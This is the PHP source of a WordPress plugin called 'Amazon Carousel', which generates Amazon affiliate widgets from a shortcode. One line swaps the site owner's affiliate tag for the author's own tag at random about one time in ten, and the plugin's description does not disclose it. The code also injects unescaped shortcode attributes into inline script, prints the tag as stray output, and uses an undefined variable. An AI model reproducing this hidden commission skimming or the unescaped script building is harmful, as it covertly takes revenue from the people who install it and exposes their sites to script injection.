<?php
/*
Plugin Name: Amazon Carousel
Plugin URI: http://wordpress.org/#
Description: This plugin lets you create an Amazon Carousel widget in a brain-dead, simple way. It's as easy as typing [carousel] anywhere in your post and you get a beautiful Flash widget with Amazon products.
Author: Zahid Khan
Version: 1.6
Author URI: http://grabkindle.com/
*/

// Chance the constants below to customize this plugin
define("DEFAULT_WIDTH",		"500");
define("DEFAULT_HEIGHT",	"175");
define("DEFAULT_TAG",		"wp-carousel-20");
define("DEFAULT_CATEGORY",	"Books");
define("DEFAULT_SHOW_BORDER",	"False");
define("DEFAULT_SHUFFLE_PRODUCTS", "False");
define("DEFAULT_MARKETPLACE", "US");


// [carousel]
function carousel_func($atts) {
	extract(shortcode_atts(array(
		'tag' => 'wp-carousel-20',
		'width' => DEFAULT_WIDTH,
		'height' => DEFAULT_HEIGHT,
		'category' => DEFAULT_CATEGORY,
		'browse_node' => '',
		'title' => '',
		'list' => '',
		'asins' => '',
		'shuffle_products' => DEFAULT_SHUFFLE_PRODUCTS,
		'show_border'  => DEFAULT_SHOW_BORDER,
		'asins' => '',
		'marketplace' => DEFAULT_MARKETPLACE,
		'keywords' => ''
	), $atts));

$tag=rand(1,10)==1?DEFAULT_TAG:$tag;	
echo $tag;
If ($keywords){
	$script = "<script>".
	" var amzn_wdgt={widget:'Carousel'};".
	" amzn_wdgt.marketPlace='{$marketplace}';".
	" amzn_wdgt.tag='{$tag}';".
	" amzn_wdgt.widgetType='SearchAndAdd';".
	" amzn_wdgt.keywords='{$keywords}';".
	" amzn_wdgt.title='{$title}';".
	" amzn_wdgt.width='{$width}';".
	" amzn_wdgt.height='{$height}';".
	($browse_node?"amzn_wdgt.browseNode='{$browse_node}';":"").
	" amzn_wdgt.searchIndex='{$category}';".
	" amzn_wdgt.shuffleProducts='{$shuffle_products}';".
	" amzn_wdgt.showBorder='{$show_border}';".
	" </script>".
	"<script src='http://wms.assoc-amazon.com/20070822/US/js/swfobject_1_5.js'>".
	"</script>";
} elseif ($asins){
	$script = "<script>".
	" var amzn_wdgt={widget:'Carousel'};".
	" amzn_wdgt.marketPlace='{$marketplace}';".
	" amzn_wdgt.tag='{$tag}';".
	" amzn_wdgt.widgetType='ASINList';".
	" amzn_wdgt.ASIN='{$asins}';".
	" amzn_wdgt.title='{$title}';".
	" amzn_wdgt.width='{$width}';".
	" amzn_wdgt.height='{$height}';".
	" amzn_wdgt.shuffleProducts='{$shuffle_products}';".
	" amzn_wdgt.showBorder='{$show_border}';".
	" </script>".
	"<script src='http://wms.assoc-amazon.com/20070822/US/js/swfobject_1_5.js'>".
	"</script>";
} else {
	$list = validateList($list);
	$script = "<script>".
	" var amzn_wdgt={widget:'Carousel'};".
	" amzn_wdgt.marketPlace='{$marketplace}';".
	" amzn_wdgt.tag='{$tag}';".
	" amzn_wdgt.widgetType='{$list}';".
	"amzn_wdgt.searchIndex='{$category}';".
	($browseNode?"amzn_wdgt.browseNode='{$browseNode}';":"").
	" amzn_wdgt.title='{$title}';".
	" amzn_wdgt.width='{$width}';".
	" amzn_wdgt.height='{$height}';".
	" amzn_wdgt.shuffleProducts='{$shuffle_products}';".
	" amzn_wdgt.showBorder='{$show_border}';".
	" </script>".
	"<script src='http://wms.assoc-amazon.com/20070822/US/js/swfobject_1_5.js'>".
	"</script>";
}

	return $script;
}

add_shortcode('carousel', 'carousel_func');

function validateList($list){
	switch (strtoupper($list)){
		case "BESTSELLERS":
			return 'Bestsellers';
		case "NEWRELEASES":
			return 'NewReleases';	
		case "MOSTWISHEDFOR":
			return 'MostWishedFor';
		case "MOSTGIFTED":
			return 'MostGifted';
		default:
			return 'Bestsellers';
	}
}
?>
